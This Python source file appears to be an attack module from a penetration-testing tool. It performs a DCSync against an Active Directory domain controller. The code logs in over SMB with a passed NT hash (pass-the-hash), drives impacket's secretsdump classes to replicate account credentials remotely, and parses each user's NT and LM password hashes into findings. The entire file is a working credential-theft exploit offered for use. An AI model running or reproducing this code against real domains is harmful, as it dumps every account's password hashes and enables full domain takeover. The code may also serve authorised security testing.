# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
DCSync — replicate Active Directory credentials via DRSUAPI without touching disk.

Requires: pip install vaultrip[attack]
"""

from __future__ import annotations

import logging
import re

from ..reporter import DCSyncFinding, ScanResult

log = logging.getLogger("vaultrip.dcsync")

_EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"

# secretsdump output line: DOMAIN\user:RID:LM:NT:::
_HASH_RE = re.compile(
    r"^(?P<domain>[^\\]+)\\(?P<user>[^:]+):\d+:(?P<lm>[a-fA-F0-9]{32}):(?P<nt>[a-fA-F0-9]{32}):::",
    re.MULTILINE,
)


def run(
    result: ScanResult,
    *,
    dc_host: str,
    ad_domain: str,
    attack_user: str,
    attack_hash: str,
    timeout: int = 30,
) -> None:
    """Perform a DCSync against *dc_host* and populate *result* with DCSyncFindings."""
    try:
        from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
        from impacket.smbconnection import SMBConnection
    except ImportError:
        result.append_error(
            "dcsync: impacket not installed — install vaultrip[attack] for DCSync support."
        )
        return

    log.info("dcsync: connecting to %s as %s\\%s", dc_host, ad_domain, attack_user)

    smb: SMBConnection | None = None
    remote_ops: RemoteOperations | None = None
    ntds: NTDSHashes | None = None

    findings: list[DCSyncFinding] = []

    def _on_secret(secret_type: str, secret: object) -> None:  # noqa: ARG001
        """Callback invoked by NTDSHashes for each credential found."""
        line = str(secret)
        m = _HASH_RE.match(line)
        if m:
            lm = m.group("lm") if m.group("lm") != _EMPTY_LM else None
            findings.append(DCSyncFinding(
                dc_host   = dc_host,
                domain    = m.group("domain") or ad_domain,
                username  = m.group("user"),
                nt_hash   = m.group("nt") or None,
                lm_hash   = lm,
            ))

    try:
        smb = SMBConnection(dc_host, dc_host, timeout=timeout)
        smb.login(attack_user, "", ad_domain, lmhash=_EMPTY_LM, nthash=attack_hash)

        remote_ops = RemoteOperations(smb, doKerberos=False)

        ntds = NTDSHashes(
            None, None,
            isRemote=True,
            history=False,
            noLMHash=False,
            remoteOps=remote_ops,
            useVSSMethod=False,
            justDCNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=None,
            justUser=None,
            ldapFilter=None,
            printUserStatus=False,
        )
        ntds.dump()

    except Exception as exc:
        result.append_error(f"dcsync: {exc}")
        log.exception("dcsync: failed")
        return
    finally:
        if ntds:
            try:
                ntds.finish()
            except Exception:
                pass
        if remote_ops:
            try:
                remote_ops.finish()
            except Exception:
                pass
        if smb:
            try:
                smb.logoff()
            except Exception:
                pass

    for f in findings:
        result.append_dcsync(f)
        log.info("dcsync: %s\\%s  NT=%s", f.domain, f.username, f.nt_hash or "-")

    log.info("dcsync: complete — %d credential(s)", len(findings))
